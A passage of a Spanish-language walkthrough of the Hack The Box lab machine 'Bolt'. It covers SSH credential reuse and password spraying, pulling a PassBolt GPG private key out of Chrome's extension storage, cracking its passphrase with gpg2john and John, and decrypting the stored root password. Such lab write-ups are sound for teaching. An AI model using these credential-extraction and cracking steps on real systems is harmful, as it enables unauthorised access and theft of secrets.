En **PassBolt** cada secreto se guarda cifrado con la **clave pública GPG** del usuario. Es decir, ese `PGP MESSAGE` solo se puede descifrar con la **clave privada** de su dueño (y su _passphrase_). Nos lo guardamos: en cuanto consigamos una clave privada, este mensaje será el que nos dé la contraseña final. Es la pieza central de la máquina.
:::

## eddie

Vimos en `/etc/passwd` que `eddie` y `clark` son usuarios reales del sistema con `/bin/bash`. Una técnica clásica de pivoting es la **reutilización de credenciales**: probamos por SSH con `eddie` las contraseñas que hemos ido recopilando por la máquina y una de ellas funciona.

:::tip
Cuando recolectas varias contraseñas, no las pruebes a mano una a una: automatiza un _password spraying_ con **hydra** o **netexec (nxc)** contra SSH. Por ejemplo `nxc ssh 10.129.35.240 -u eddie -p passwords.txt`. Reutilizar credenciales entre servicios es uno de los caminos más rentables en cualquier CPTS/OSCP.
:::

```bash
❯ ssh eddie@10.129.35.240
[...]
eddie@10.129.35.240's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.13.0-27-generic x86_64)
[...]
You have mail.
Last login: Wed Jan 26 09:54:31 2022 from 10.10.14.23
eddie@bolt:~$ cat user.txt 
4fe6c5b1174c8730043...
```

## root

Si nos fijamos en la bienvenida, nos pone que tenemos email. Vamos a buscarlo:

```bash
eddie@bolt:~$ find / -type d -name mail 2>/dev/null
/home/eddie/.cache/evolution/mail
/home/eddie/.local/share/evolution/mail
/var/mail
eddie@bolt:~$ cat /var/mail/eddie 
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: <clark@bolt.htb>
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
	id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: <eddie@bolt.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20210225212019.DFF264CD@bolt.htb>
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold <clark@bolt.htb>

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
```

Interesante, nos comenta el usuario `clark` que el servidor de gestión de contraseñas ya está funcionando, que `eddie` debe descargar una extensión para el navegador y — la frase clave — que **su clave privada es la única forma de recuperar la cuenta**. Antes vimos que en la base de datos existía un mensaje encriptado con GPG, así que si damos con la clave privada de `eddie` podremos descifrarlo.

### Recuperando la clave privada GPG

La extensión de **PassBolt** guarda la clave privada del usuario en el perfil de **Google Chrome**. Buscamos recursivamente por la cabecera del bloque de clave privada dentro del home de `eddie`:

```bash
eddie@bolt:~$ grep -r 'BEGIN PGP PRIVATE' ~
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
Binary file /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

:::tip
Las dos primeras coincidencias son solo código JS de la extensión (la _plantilla_ de la cabecera), no una clave real. La que nos interesa es la última: `Local Extension Settings/.../000003.log`. Ese fichero es la base de datos **LevelDB** donde Chrome persiste el estado de la extensión, y ahí es donde queda guardada la clave privada **real** que el usuario importó.
:::

Como es un fichero binario, usamos `strings` para volcar su contenido legible y `grep -oP` para extraer únicamente el bloque de la clave privada:

```bash
eddie@bolt:~$ strings '/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log' | grep -oP '\-\-\-\-\-BEGIN PGP PRIVATE KEY BLOCK[\s\S]*?END PGP PRIVATE KEY BLOCK\-\-\-\-\-' | head -1 | sed 's/\\\\n/\n/g'
-----BEGIN PGP PRIVATE KEY BLOCK-----\\r
Version: OpenPGP.js v4.10.9\\r
Comment: https://openpgpjs.org\\r
\\r
xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi\\r
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk\\r
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU\\r
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU\\r
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a\\r
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB\\r
AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW\\r
[...]
6599FMcw9nGzypVOgqgQv8JGmIUeCipD10k8nHW7m9YBfQB04y9wJw99WNw/\\r
Ic3vdhZ6NvsmLzYI21dnWD287sPj2tKAuhI0AqCEkiRwb4Z4CSGgJ5TgGML8\\r
11Izrkqamzpc6mKBGi213tYH6xel3nDJv5TKm3AGwXsAhJjJw+9K0MNARKCm\\r
YZFGLdtA/qMajW4/+T3DJ79YwPQOtCrFyHiWoIOTWfs4UhiUJIE4dTSsT/W0\\r
PSwYYWlAywj5\\r
=cqxZ\\r
-----END PGP PRIVATE KEY BLOCK-----
```

La clave privada está protegida por una **passphrase**. Guardamos el bloque en un fichero (`eddie.pgp`, recordando quitar los `\r` sobrantes que arrastró el `strings`) y lo convertimos a un formato crackeable con `gpg2john` para lanzar un ataque de diccionario:

:::tip
`gpg2john` extrae de la clave privada un hash sobre el que **John** puede iterar la _passphrase_. Ojo con el coste: en la salida verás `s2k-count 16777216`, es decir, la clave usa muchísimas iteraciones de derivación → cada intento es lento (unos ~45 candidatos/segundo aquí). Por eso el crackeo tarda varios minutos: paciencia y un buen diccionario como `rockyou.txt`.
:::

```bash
❯ gpg2john eddie.pgp > eddie.hash.pgp
❯ cat eddie.hash.pgp
─────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     │ File: eddie.hash.pgp
─────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1 │ Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a
     │ 8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd
     │ 6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134d
     │ cdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa
     │ 2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d7
     │ 3de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc021488
     │ 6e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53
     │ da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4f
     │ a6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f
     │ 151cdd50c522afe33dbe4265d2*3*254*8*9*16*b81f0847e01fb836c8cc7c8a2af31f19*16777216*34af9ef3956d5ad8:::Eddie Johnson <eddie@bolt.htb>::eddie.pgp
─────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ john --wordlist=/usr/share/wordlists/rockyou.txt eddie.hash.pgp
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
merrychristmas   (Eddie Johnson)     
1g 0:00:15:47 DONE (2026-07-26 15:09) 0.001055g/s 45.20p/s 45.20c/s 45.20C/s mhines..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

John nos revela la _passphrase_ `merrychristmas`. Con la clave privada y su _passphrase_ ya podemos descifrar el `PGP MESSAGE` que sacamos antes de la tabla `secrets`.

### Descifrando el secreto de PassBolt

Una vez teniendo la contraseña iremos a una herramienta online para **PGP** como [esta](https://www.devglan.com/online-tools/pgp-encryption-decryption) y desencriptaremos el mensaje:

![Mensaje Desencriptado](./10.png)

:::caution
Usar una web de terceros para descifrar es cómodo, pero **nunca** pegues una clave privada real en un servicio online: podrías estar entregándola a un atacante. En un entorno real (o para el examen) hazlo en local:

```bash
gpg --import eddie.pgp            # importa la clave privada (pedirá la passphrase merrychristmas)
echo "-----BEGIN PGP MESSAGE----- ... " | gpg --decrypt
```
:::

El mensaje descifrado no es otra cosa que la **contraseña de `root`**. Ahora simplemente hacemos `su root` con esa contraseña:

```bash
eddie@bolt:~$ su root
Password: 
root@bolt:/home/eddie# whoami
root
root@bolt:/home/eddie# cat /root/root.txt 
2a8f15804cb8b7cb198fc...
```

Y con esto habríamos comprometido la máquina por completo. 🚩

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/384)

---
